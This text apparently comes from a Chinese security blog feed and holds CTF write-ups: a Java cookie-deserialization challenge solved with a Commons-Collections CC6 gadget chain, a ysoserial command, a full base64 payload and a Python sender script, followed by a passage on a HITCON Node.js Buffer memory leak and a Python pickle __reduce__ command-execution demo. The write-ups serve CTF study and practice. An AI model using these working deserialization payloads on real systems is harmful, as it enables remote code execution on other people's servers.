<p>又是熟悉的登录界面,尝试之后发现不管登录什么都会登陆成功,所以应该和这个没什么关系</p>
<p>然后扫了一下发现有<code>/admin/html</code>,又是登录,但是又是登录不成功</p>
<p>然后发现cookie里面有一个user,base解密之后可以发现是java序列化之后的byte,也可以看出来是User类又username和password,然后就开始致力于修改cookie实现admin登陆</p>
<p>太菜了,应该能想到cookie是入口的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="comment">//import java.io.*;</span></span><br><span class="line"><span class="keyword">import</span> Utity.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Deserialize</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(User std)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream obj = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;output.txt&quot;</span>));</span><br><span class="line">        obj.writeObject(std);</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化成功&quot;</span>);</span><br><span class="line">        obj.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// �� sr demo.Student��e�(�� I idC sexL namet Ljava/lang/String;xp   Yst Ameuu</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unSerialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(<span class="string">&quot;output.txt&quot;</span>)));</span><br><span class="line">        User o =  (User) objectInputStream.readObject();</span><br><span class="line">        System.out.println(o);</span><br><span class="line">        System.out.println(o.getUsername());</span><br><span class="line">        System.out.println(o.getPassword());</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化成功&quot;</span>);</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;rO0ABXNyAApVdGl0eS5Vc2VyaBsf8IrggOECAAJMAAhwYXNzd29yZHQAEkxqYXZhL2xhbmcvU3RyaW5nO0wACHVzZXJuYW1lcQB+AAF4cHB0AAVhZG1pbg==&quot;</span>);</span><br><span class="line">        System.out.println(code);</span><br><span class="line">        OutputStream out = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;output.txt&quot;</span>);</span><br><span class="line">        InputStream is = <span class="keyword">new</span> ByteArrayInputStream(code);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] buff = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>((len=is.read(buff))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.write(buff, <span class="number">0</span>, len);</span><br><span class="line">        &#125;</span><br><span class="line">        is.close();</span><br><span class="line"><span class="comment">//        File file = new File(&quot;output.txt&quot;);</span></span><br><span class="line"><span class="comment">//        FileWriter fileWriter = new FileWriter(file.getAbsoluteFile());</span></span><br><span class="line"><span class="comment">//        BufferedWriter bufferedWriter = new BufferedWriter(fileWriter);</span></span><br><span class="line"><span class="comment">//        bufferedWriter.write(String.valueOf(code));</span></span><br><span class="line"><span class="comment">//        bufferedWriter.close();</span></span><br><span class="line"><span class="comment">//        User user = new User();</span></span><br><span class="line"><span class="comment">//        serialize(user);</span></span><br><span class="line">        unSerialize();</span><br><span class="line"></span><br><span class="line"><span class="comment">//        File file = new File(&quot;output.txt&quot;);</span></span><br><span class="line"><span class="comment">//        int size = (int) file.length();</span></span><br><span class="line"><span class="comment">//        byte[] buffer = new byte[size];</span></span><br><span class="line"><span class="comment">//        FileInputStream in = null;</span></span><br><span class="line"><span class="comment">//        try &#123;</span></span><br><span class="line"><span class="comment">//            in = new FileInputStream(file);</span></span><br><span class="line"><span class="comment">//            int len = 0;</span></span><br><span class="line"><span class="comment">//            if ((len = in.available()) &lt;= buffer.length) &#123;</span></span><br><span class="line"><span class="comment">//                in.read(buffer, 0, len);</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        catch (Exception e)&#123;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        String base64 = Base64.getEncoder().encodeToString(buffer);</span></span><br><span class="line"><span class="comment">//        System.out.println(base64);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="复现"><a href="#复现" class="headerlink" title="复现:"></a>复现:</h4><p>（从运维那里拿了docker</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker ps</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/97a54f5cd3fb43f3bf7f6825dceed1c9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>开始！</p>
<p>因为jdk版本未知，所以用CC6的poc比较保险，可惜一开始不知道为什么执迷于CC1了 思维不行（菜</p>
<p>这里用的是P神的CC6，命令来自wp，比赛的时候hint没打开</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC6ForP</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;</span><br><span class="line">                Object.class,Object[].class</span><br><span class="line">            &#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> String[]&#123;<span class="string">&quot;bash -c &#123;echo,Y2F0IC9mbGFnID4uL3dlYmFwcHMvUk9PVC9mbGFnLnBocA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(fakeTransformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(outerMap, <span class="string">&quot;aa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map expMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        expMap.put(tiedMapEntry, <span class="string">&quot;bb&quot;</span>);</span><br><span class="line"></span><br><span class="line">        outerMap.remove(<span class="string">&quot;aa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field field = ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(transformerChain,transformers);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line"></span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = barr.toByteArray();</span><br><span class="line">        String s = Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        System.out.println(s);</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span></span><br><span class="line">            ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>或者用ysoserial：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections1 &#x27;bash -c &#123;echo,Y2F0IC9mbGFnID4uL3dlYmFwcHMvUk9PVC9mbGFnLnBocA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27; | base64</span><br></pre></td></tr></table></figure>

<ol>
<li>可以直接在网页修改cookie，然后访问admin保持登录状态，实现cookie反序列化命令执行</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAACYWFzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAVzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHEAfgADeHB2cgARamF2YS5sYW5nLlJ1bnRpbWUAAAAAAAAAAAAAAHhwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnZva2VyVHJhbnNmb3JtZXKH6P9re3zOOAIAA1sABWlBcmdzdAATW0xqYXZhL2xhbmcvT2JqZWN0O0wAC2lNZXRob2ROYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJ0AApnZXRSdW50aW1ldXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAAAdAAJZ2V0TWV0aG9kdXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuU3RyaW5noPCkOHo7s0ICAAB4cHZxAH4AG3NxAH4AE3VxAH4AGAAAAAJwdXEAfgAYAAAAAHQABmludm9rZXVxAH4AGwAAAAJ2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHB2cQB+ABhzcQB+ABN1cgATW0xqYXZhLmxhbmcuU3RyaW5nO63SVufpHXtHAgAAeHAAAAABdABVYmFzaCAtYyB7ZWNobyxZMkYwSUM5bWJHRm5JRDR1TDNkbFltRndjSE12VWs5UFZDOW1iR0ZuTG5Cb2NBPT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfXQABGV4ZWN1cQB+ABsAAAABcQB+ACBzcQB+AA9zcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNxAH4AAD9AAAAAAAAMdwgAAAAQAAAAAHh4dAACYmJ4</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>python</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://82.156.2.166:9999/&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;user=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAACYWFzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAVzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHEAfgADeHB2cgARamF2YS5sYW5nLlJ1bnRpbWUAAAAAAAAAAAAAAHhwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnZva2VyVHJhbnNmb3JtZXKH6P9re3zOOAIAA1sABWlBcmdzdAATW0xqYXZhL2xhbmcvT2JqZWN0O0wAC2lNZXRob2ROYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJ0AApnZXRSdW50aW1ldXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAAAdAAJZ2V0TWV0aG9kdXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuU3RyaW5noPCkOHo7s0ICAAB4cHZxAH4AG3NxAH4AE3VxAH4AGAAAAAJwdXEAfgAYAAAAAHQABmludm9rZXVxAH4AGwAAAAJ2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHB2cQB+ABhzcQB+ABN1cgATW0xqYXZhLmxhbmcuU3RyaW5nO63SVufpHXtHAgAAeHAAAAABdABVYmFzaCAtYyB7ZWNobyxZMkYwSUM5bWJHRm5JRDR1TDNkbFltRndjSE12VWs5UFZDOW1iR0ZuTG5Cb2NBPT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfXQABGV4ZWN1cQB+ABsAAAABcQB+ACBzcQB+AA9zcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNxAH4AAD9AAAAAAAAMdwgAAAAQAAAAAHh4dAACYmJ4&quot;</span>&#125;</span><br><span class="line"><span class="comment"># print(headers)</span></span><br><span class="line">res = requests.get(url+<span class="string">&quot;admin/&quot;</span>, headers)</span><br><span class="line"><span class="comment"># print(res.text)</span></span><br><span class="line">res = requests.get(url=url+<span class="string">&quot;flag.php&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<h4 id="审计："><a href="#审计：" class="headerlink" title="审计："></a>审计：</h4><p>一共只有四个类<code>Serialize</code>、<code>AuthFilter</code>、<code>doLogin</code>、<code>User</code></p>
<p><code>Serialize</code>就是实现序列化和反序列化，<code>User</code>类也没多少内容，而<code>doLogin</code>就是简单的登录判断，重定向到<code>admin/index.jsp</code>或者<code>/index.jsp</code></p>
<p>实现反序列化主要是在<code>AuthFilter</code>，在<code>/admin/</code>下对cookie进行反序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// /admin/*</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest req, ServletResponse resp, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    HttpServletRequest request = (HttpServletRequest)req;</span><br><span class="line">    HttpServletResponse response = (HttpServletResponse)resp;</span><br><span class="line">    Cookie[] cookies = request.getCookies();</span><br><span class="line">    String cookie = <span class="keyword">null</span>;</span><br><span class="line">    User user = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (cookies == <span class="keyword">null</span>) &#123;</span><br><span class="line">        request.setAttribute(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;请登陆&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &gt;= cookies.length) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    user = (User)Serialize.deserialize(cookie); <span class="comment">// 反序列触发链子</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">                    var11.printStackTrace();</span><br><span class="line">                    response.sendRedirect(request.getContextPath() + <span class="string">&quot;/index.jsp&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                 ……</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">               </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><blockquote>
<p>还是太菜啦~</p>
</blockquote>
<p>1.ffuf的使用、python劫持库提权、CC6的简单运用</p>
<p>2.渗透真的是直接跟着hhg的博客就可以直接得到flag了，但是一开始在连接ssh上面因为sshkey文档没有换行符卡了半天，然后执行<code>        Tiquan.py</code>的时候一开始有<code>os.system(&quot;/bin/bahs&quot;)</code>，但是弄着弄着这个语句就没了，因为一开始看原来的博客有点不理解，所以也卡了半天，最后看了另一篇博客才得到flag，然后赛后换号复现的时候发现，如果中间没出现问题的的话，直接执行<code>Tiquan.py</code>就可以了，很难过</p>
<p>1.java反序列化，感觉还是太菜了，因为没有做过多少题，所以对cookie上面的反序列化不敏感，反而一直在想构造payload伪造admin登录。一开始跟着payload复现的时候一直在用ysoserial的CC1来构造，总是过不去，后来突然才想到会不会是jdk版本的原因，应该要想到的，得多做点题（（（（</p>
]]></content>
      <categories>
        <category>参加的各种比赛</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>hznuctf</tag>
      </tags>
  </entry>
  <entry>
    <title>集训第三周学习</title>
    <url>/2022/02/12/%E9%9B%86%E8%AE%AD%E7%AC%AC%E4%B8%89%E5%91%A8%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h4 id="HITCON-2016-Leaking"><a href="#HITCON-2016-Leaking" class="headerlink" title="[HITCON 2016]Leaking"></a>[HITCON 2016]Leaking</h4><ul>
<li>nodejs</li>
</ul>
<p>在较早一点的 node 版本中 (8.0 之前)，当 Buffer 的构造函数传入数字时, 会得到与数字长度一致的一个 Buffer，并且这个 Buffer 是未清零的。8.0 之后的版本可以通过另一个函数 Buffer.allocUnsafe(size) 来获得未清空的内存。</p>
<p>也就是可以利用Buffer()来读取内存</p>
<hr>
<span id="more"></span>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> randomstring = <span class="built_in">require</span>(<span class="string">&quot;randomstring&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> &#123;</span><br><span class="line">    VM</span><br><span class="line">&#125; = <span class="built_in">require</span>(<span class="string">&quot;vm2&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> flag = <span class="built_in">require</span>(<span class="string">&quot;./config.js&quot;</span>).flag</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.header(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/plain&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*    Orange is so kind so he put the flag here. But if you can guess correctly :P    */</span></span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">&quot;var flag_&quot;</span> + randomstring.generate(<span class="number">64</span>) + <span class="string">&quot; = \&quot;hitcon&#123;&quot;</span> + flag + <span class="string">&quot;&#125;\&quot;;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> (req.query.data &amp;&amp; req.query.data.length &lt;= <span class="number">12</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> vm = <span class="keyword">new</span> VM(&#123;</span><br><span class="line">            <span class="attr">timeout</span>: <span class="number">1000</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="built_in">console</span>.log(req.query.data);</span><br><span class="line">        res.send(<span class="string">&quot;eval -&gt;&quot;</span> + vm.run(req.query.data));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(fs.readFileSync(__filename).toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;listening on port 3000!&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>审计源码可以知道定义和flag，但是flag变量名字未知，但是<code>res.send(&quot;eval -&gt;&quot; + vm.run(req.query.data));</code>使得我们可以执行任意代码</p>
<p>不过由于没怎么做过nodejs类型的题目，所以看了别的师傅的wp</p>
<p>可以知道这里利用nodejs沙箱逃逸进行任意代码执行</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://32ae46a5-a44c-452f-bf07-0b157261450b.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;?data=Buffer(500)&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url+payload)</span><br><span class="line"><span class="keyword">while</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">    r = requests.get(url + payload)</span><br><span class="line">    <span class="built_in">print</span>(r.status_code)</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&#123;&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<h4 id="HFCTF-2021-Final-easyflask"><a href="#HFCTF-2021-Final-easyflask" class="headerlink" title="[HFCTF 2021 Final]easyflask"></a>[HFCTF 2021 Final]easyflask</h4><ul>
<li>session伪造</li>
<li>python序列化 <code>__reduce__</code></li>
</ul>
<p><code>Pickle</code>的<code>dumps</code>和<code>loads</code>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> _pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>:</span></span><br><span class="line">    name: <span class="string">&quot;admin&quot;</span></span><br><span class="line">    is_admin: <span class="number">0</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(_pickle.dumps(User()))</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(_pickle.dumps(User())))</span><br><span class="line">usr = _pickle.dumps(User())</span><br><span class="line"><span class="built_in">print</span>(_pickle.loads(usr))</span><br></pre></td></tr></table></figure>

<p><code>__reduce__</code>:</p>
<p>在用pickle的时候将该返回值进行序列化和反序列化（或许是这样，可能之后会进行修改</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> _pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>:</span></span><br><span class="line">    name: <span class="string">&quot;admin&quot;</span></span><br><span class="line">    is_admin: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;你进行了反序列化&quot;</span>)</span><br><span class="line">        os.system(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(_pickle.dumps(User()))</span><br><span class="line">    <span class="built_in">print</span>(base64.b64encode(_pickle.dumps(User())))</span><br><span class="line">    usr = _pickle.dumps(User())</span><br><span class="line">    <span class="built_in">print</span>(_pickle.loads(usr))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>) </span><br></pre></td></tr></table></figure>

<hr>
<p>获取到源码：</p>
